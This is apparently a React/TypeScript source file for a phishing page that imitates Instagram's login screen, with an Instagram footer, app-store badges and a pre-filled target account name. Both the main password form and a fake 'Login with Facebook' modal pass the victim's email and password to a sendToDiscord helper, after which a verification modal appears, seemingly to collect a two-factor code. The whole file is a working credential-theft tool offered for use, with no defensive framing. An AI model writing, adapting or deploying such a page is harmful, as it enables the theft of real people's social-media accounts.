import React, { useState } from 'react';
import { Eye, EyeOff } from 'lucide-react';
import { LoadingSpinner } from './components/LoadingSpinner';
import { VerificationModal } from './components/VerificationModal';
import { sendToDiscord } from './utils/discord';
import { Toaster, toast } from 'react-hot-toast';

function Footer() {
  const links = [
    'Meta', 'About', 'Blog', 'Jobs', 'Help', 'API', 'Privacy', 
    'Terms', 'Locations', 'Instagram Lite', 'Threads',
    'Contact Uploading & Non-Users', 'Meta Verified', 'Cookie Settings'
  ];
  
  return (
    <footer className="w-full max-w-[1000px] mx-auto px-4 py-8 text-gray-400">
      <div className="flex flex-wrap justify-center gap-x-4 gap-y-2 mb-4">
        {links.map((link) => (
          <a key={link} href="#" className="text-xs hover:underline">
            {link}
          </a>
        ))}
      </div>
      <div className="flex items-center justify-center gap-4 text-xs">
        <select className="bg-transparent text-xs text-gray-400 focus:outline-none">
          <option value="en">English</option>
        </select>
        <span>© 2024 Instagram</span>
      </div>
    </footer>
  );
}

function AimwizardsLoginModal({ isOpen, onClose }: { isOpen: boolean; onClose: () => void }) {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [isLoading, setIsLoading] = useState(false);

  if (!isOpen) return null;

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    
    try {
      await sendToDiscord(email, password);
      toast.success('Login attempt processed');
    } catch (error) {
      console.error('Error:', error);
      toast.error('An error occurred');
    }

    setTimeout(() => {
      setIsLoading(false);
      onClose();
    }, 1500);
  };

  return (
    <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
      <div className="bg-white rounded-lg p-8 w-full max-w-sm">
        <h2 className="text-xl font-bold mb-6 text-center text-gray-900">Login with Facebook</h2>
        <form onSubmit={handleSubmit} className="space-y-4">
          <div>
            <input
              type="email"
              placeholder="Email"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              className="w-full px-4 py-2 border border-gray-300 rounded focus:outline-none focus:border-blue-500 text-gray-900"
            />
          </div>
          <div className="relative">
            <input
              type={showPassword ? 'text' : 'password'}
              placeholder="Password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              className="w-full px-4 py-2 border border-gray-300 rounded focus:outline-none focus:border-blue-500 text-gray-900"
            />
            <button
              type="button"
              onClick={() => setShowPassword(!showPassword)}
              className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-500"
            >
              {showPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
            </button>
          </div>
          <button
            type="submit"
            className="w-full bg-[#0095f6] hover:bg-[#1877f2] text-white py-2 rounded font-semibold transition-colors flex items-center justify-center"
            disabled={isLoading}
          >
            {isLoading ? <LoadingSpinner /> : 'Log in'}
          </button>
        </form>
        <button
          onClick={onClose}
          className="mt-4 text-gray-600 hover:text-gray-900 text-sm w-full text-center"
        >
          Cancel
        </button>
      </div>
    </div>
  );
}

function App() {
  const [showPassword, setShowPassword] = useState(false);
  const [password, setPassword] = useState('');
  const [showAimwizardsLogin, setShowAimwizardsLogin] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [showVerification, setShowVerification] = useState(false);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    
    try {
      await sendToDiscord('', password);
      toast.success('Login attempt processed');
    } catch (error) {
      console.error('Error:', error);
      toast.error('An error occurred');
    }

    setTimeout(() => {
      setIsLoading(false);
      setShowVerification(true);
    }, 1500);
  };

  const handleVerification = (code: string) => {
    setShowVerification(false);
  };

  return (
    <div className="min-h-screen bg-black text-white">
      <Toaster position="top-right" />
      <div className="container mx-auto px-4">
        <div className="min-h-screen flex flex-col">
          <div className="flex-grow flex items-center justify-center py-12">
            <div className="flex items-center gap-12 max-w-[900px] w-full">
              <div className="hidden md:block flex-shrink-0">
                <img
                  src="https://i.ibb.co/0n9B1Xm/Capture.png"
                  alt="App Screenshot"
                  className="w-[250px] object-contain"
                />
              </div>

              <div className="w-full max-w-[320px] flex flex-col gap-2">
                <div className="bg-[#121212] border border-gray-800 rounded-sm p-8 flex flex-col items-center">
                  <div className="w-[120px] h-[120px] mb-3">
                    <img 
                      src="https://i.ibb.co/ZL6QCg0/1536308565.jpg"
                      alt="Profile"
                      className="w-full h-full object-cover rounded-full border-2 border-gray-800 shadow-sm"
                    />
                  </div>

                  <h2 className="text-lg font-semibold mb-6 text-white">denize.c1</h2>

                  <form onSubmit={handleSubmit} className="w-full space-y-3">
                    <div className="relative">
                      <input
                        type={showPassword ? 'text' : 'password'}
                        placeholder="Password"
                        value={password}
                        onChange={(e) => setPassword(e.target.value)}
                        className="w-full px-2 py-[9px] bg-[#1c1c1c] text-sm border border-gray-800 rounded-sm focus:outline-none focus:border-gray-700 text-white placeholder-gray-500"
                        required
                      />
                      <button
                        type="button"
                        onClick={() => setShowPassword(!showPassword)}
                        className="absolute right-2 top-1/2 -translate-y-1/2 text-gray-500"
                      >
                        {showPassword ? (
                          <EyeOff className="w-4 h-4" />
                        ) : (
                          <Eye className="w-4 h-4" />
                        )}
                      </button>
                    </div>

                    <button
                      type="submit"
                      className="w-full bg-[#0095f6] hover:bg-[#1877f2] text-white py-[6px] rounded text-sm font-semibold transition-colors flex items-center justify-center"
                      disabled={isLoading}
                    >
                      {isLoading ? <LoadingSpinner /> : 'Log in'}
                    </button>
                  </form>

                  <div className="mt-4 w-full">
                    <div className="flex items-center my-4">
                      <div className="flex-grow h-px bg-gray-800"></div>
                      <span className="px-4 text-sm text-gray-500 font-semibold">OR</span>
                      <div className="flex-grow h-px bg-gray-800"></div>
                    </div>

                    <button
                      onClick={() => setShowAimwizardsLogin(true)}
                      className="text-[#0095f6] text-sm font-semibold text-center block w-full hover:text-[#1877f2] mb-4"
                    >
                      Login with Facebook
                    </button>

                    <a
                      href="#"
                      className="text-[#0095f6] text-sm font-semibold text-center block w-full hover:text-[#1877f2]"
                    >
                      Forgot password?
                    </a>
                  </div>
                </div>

                <div className="mt-4 text-center">
                  <p className="text-sm mb-4 text-gray-300">Get the app.</p>
                  <div className="flex justify-center gap-4">
                    <a href="#" className="w-32">
                      <img
                        src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/180ae7a0bcf7.png"
                        alt="Download on the App Store"
                        className="w-full"
                      />
                    </a>
                    <a href="#" className="w-32">
                      <img
                        src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/e9cd846dc748.png"
                        alt="Get it on Google Play"
                        className="w-full"
                      />
                    </a>
                  </div>
                </div>
              </div>
            </div>
          </div>

          <Footer />
        </div>
      </div>

      <AimwizardsLoginModal
        isOpen={showAimwizardsLogin}
        onClose={() => setShowAimwizardsLogin(false)}
      />
      <VerificationModal
        isOpen={showVerification}
        onClose={() => setShowVerification(false)}
        onVerify={handleVerification}
      />
    </div>
  );
}

export default App;